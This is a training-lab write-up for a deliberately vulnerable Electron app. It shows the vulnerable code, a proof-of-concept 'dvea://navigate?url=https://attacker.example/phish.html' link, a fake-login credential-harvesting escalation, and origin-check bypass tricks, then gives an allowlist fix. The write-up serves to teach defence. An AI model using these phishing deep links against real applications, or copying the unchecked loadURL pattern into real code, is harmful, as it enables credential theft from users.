# Deep Link → Untrusted Navigation — Writeup

Module: Deep Link Hijacking
Lab page: `src/renderer/pages/deep-link-untrusted-navigation.html`
Vulnerable code: `src/main/main.js`

## 1. Objective

Craft a deep link that loads attacker-controlled content in the trusted app window.

---

## 2. Exploitation walkthrough

**Step 1 — find the route.** DVEA registers the `dvea://` scheme
(`app.setAsDefaultProtocolClient('dvea')` in `src/main/main.js`) and routes incoming links
through `handleDeepLink(url)`. That function reads a `url` query parameter and, if present,
opens a new app window and loads the target into it via the shared
`openUntrustedNavigationWindow()` helper — no scheme check, no host allowlist, no
confirmation:

```js
function openUntrustedNavigationWindow(target) {
  const win = new BrowserWindow({
    width: 480,
    height: 640,
    show: false,
    resizable: true,
    maximizable: true,
    title: 'DVEA',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
    },
  });
  // Vulnerable navigation: main process directly loads the attacker URL into a new window
  win.loadURL(target);
  win.once('ready-to-show', () => win.show());
  return win;
}

async function handleDeepLink(url) {
  try {
    const parsed = new URL(url);
    // Route: navigate window to a URL (dvea://navigate?url=...)
    const target = parsed.searchParams.get('url');
    if (target && mainWindow) {
      try {
        openUntrustedNavigationWindow(target);
      } catch (err) {
        console.error('Failed to navigate to deep link target:', err);
      }
      return;
    }
    ...
```

So the real-world attack primitive is a link of the shape:

```
dvea://navigate?url=<attacker-controlled URL>
```

**Step 2 — build the payload.** Any absolute URL works, because `target` is handed to
`win.loadURL()` completely unchecked. The simplest proof-of-concept:

```
dvea://navigate?url=https://attacker.example/phish.html
```

Clicking this link anywhere (email, chat, a webpage) — on a packaged install where the OS
has registered the `dvea://` scheme — makes DVEA pop open a new, native-looking,
`DVEA`-titled window with no address bar, showing `https://attacker.example/phish.html`.
There's no visible signal that the content came from an attacker rather than the app
itself; the app's main window is untouched, so the victim likely doesn't even notice
anything unusual happened besides a new window appearing.

**Step 3 — reproduce locally without OS scheme registration.** Running DVEA from source
(`npm start`) does not reliably register the `dvea://` scheme with the OS (noted on the
parent Deep Link Hijacking page), so real `dvea://` links won't dispatch to the app during
development. The lab's "Simulate Deep Link" control exists to exercise the *literally
identical* vulnerable code path without needing OS registration — it calls the
`simulate-deeplink-window` IPC handler, which now calls the exact same
`openUntrustedNavigationWindow()` helper `handleDeepLink` uses:

```js
// src/main/main.js
ipcMain.handle('simulate-deeplink-window', (event, target) => {
  try {
    if (!target) return;
    openUntrustedNavigationWindow(target);
  } catch (err) {
    console.error('simulate-deeplink-window failed:', err);
  }
});
```

Type `https://attacker.example/phish.html` (or any URL you control) into the lab's target
field and click **Simulate Deep Link** — the same new, app-titled window opens and loads
it, proving the objective: attacker-controlled content is now running inside a window the
user believes belongs to DVEA. Because both the real deep-link path and this simulator
route through `openUntrustedNavigationWindow()`, this is not merely a similar reproduction —
it is the same code executing.

**Step 4 — escalate to credential harvesting (bonus).** DVEA bundles a native-looking fake
login page at `src/renderer/pages/fake-login.html`. Pointing the same `target` at that
file's resolved `file://` URL — e.g., typing
`file:///<path-to-DVEA>/src/renderer/pages/fake-login.html` into the field, or, more
realistically, a `dvea://navigate?url=file:///...fake-login.html` link an attacker who has
extracted the app's `asar` archive (`npx asar extract app.asar ./out`) could construct —
opens the popup window showing a "Session Expired — Sign In" prompt. Submitting that form
sends the entered credentials over the `captured-credentials` IPC channel, which main
forwards to the lab page's "Attacker view" panel; the login page then calls
`window.close()` on itself, which only closes that popup — the lab page (and the rest of
the app) is unaffected, exactly as it would be for a real victim who wouldn't see anything
crash or misbehave. This is exactly how a phishing deep link would harvest real user
credentials in the wild, and it works identically whether it was triggered by a real
`dvea://navigate` link or the in-app simulator.

---

## 3. Vulnerable code vs. fixed code

**Vulnerable** (`src/main/main.js`):

```js
function openUntrustedNavigationWindow(target) {
  const win = new BrowserWindow({
    width: 480,
    height: 640,
    show: false,
    resizable: true,
    maximizable: true,
    title: 'DVEA',
    webPreferences: {
      preload: path.join(__dirname, 'preload.js'),
    },
  });
  // Vulnerable navigation: main process directly loads the attacker URL into a new window
  win.loadURL(target);
  win.once('ready-to-show', () => win.show());
  return win;
}
```

`handleDeepLink`'s `dvea://navigate?url=...` branch and the `simulate-deeplink-window` IPC
handler both call this one function with the attacker-controlled `target` — it's the single
choke point where the untrusted URL actually reaches `loadURL()`.

**Fixed** — allowlist the origin inside that one shared choke point, before ever calling
`loadURL()`:

```diff
+const ALLOWED_NAVIGATE_ORIGINS = new Set([
+  'https://app.dvea.example',   // DVEA's own trusted web origin(s) only
+]);
+
 function openUntrustedNavigationWindow(target) {
+  const targetOrigin = new URL(target).origin;
+  if (!ALLOWED_NAVIGATE_ORIGINS.has(targetOrigin)) {
+    console.warn('Blocked untrusted deep-link navigation target:', target);
+    return null;
+  }
   const win = new BrowserWindow({
     width: 480,
     height: 640,
     show: false,
     resizable: true,
     maximizable: true,
     title: 'DVEA',
     webPreferences: {
       preload: path.join(__dirname, 'preload.js'),
     },
   });
   win.loadURL(target);
   win.once('ready-to-show', () => win.show());
   return win;
 }
```

Because `handleDeepLink` and `simulate-deeplink-window` both call this same function, fixing
it here closes the hole for both at once — no need to duplicate the check at each call
site. (There is a separate, older `simulate-deeplink` IPC handler still in `main.js` that
calls `mainWindow.loadURL(target)` directly rather than going through this helper — it is
not called from any current renderer page, but it would need the identical check applied
directly if it were ever wired back up.)

---

## 4. Why the fix works

- **Compare the origin, not a substring.** `new URL(target).origin` normalizes to
  `scheme://host:port` and is compared against a `Set` with `.has()` — exact match only.
  A naive check like `target.startsWith('https://app.dvea.example')` is bypassable with
  `https://app.dvea.example.attacker.com` (attacker-controlled subdomain of a lookalike
  domain) or `https://app.dvea.example@attacker.com` (userinfo trick on some parsers).
  Comparing the *parsed* origin closes both of those off, because `new URL(...).origin`
  always resolves to the actual host that will be contacted, regardless of what prefix or
  userinfo precedes it in the raw string.
- **Fix the shared choke point, not each caller.** Both the real deep-link handler and the
  simulator call `openUntrustedNavigationWindow()`; putting the check inside that function
  means one edit protects every current and future caller, rather than relying on each new
  call site to remember to validate independently. That's also exactly why this function
  was worth centralizing in the first place — see the note in section 2 about the real
  handler and the simulator running literally the same code.
- **Fail closed.** If `target`'s origin isn't in the allowlist, the function returns `null`
  and never constructs a window or calls `loadURL()` at all — there's no fallback redirect
  to "somewhere safe" that could itself be manipulated.
- **Allowlist, not denylist.** A denylist of "bad" schemes/hosts is always incomplete (new
  schemes, IDN homographs, unusual capitalization); an allowlist of the handful of origins
  DVEA actually needs to navigate to is finite, auditable, and fails safe by default for
  anything not explicitly approved.
- **This is a defense specifically against *this* deep-link handler** — it doesn't replace
  other Electron hardening (`contextIsolation`, disabling `nodeIntegration`, a
  `setWindowOpenHandler`/`will-navigate` guard on the window itself). Those protect the
  renderer once *something* has loaded; this fix stops the untrusted content from being
  loaded into a trusted-looking window in the first place, which is the actual vulnerability
  this lab demonstrates.
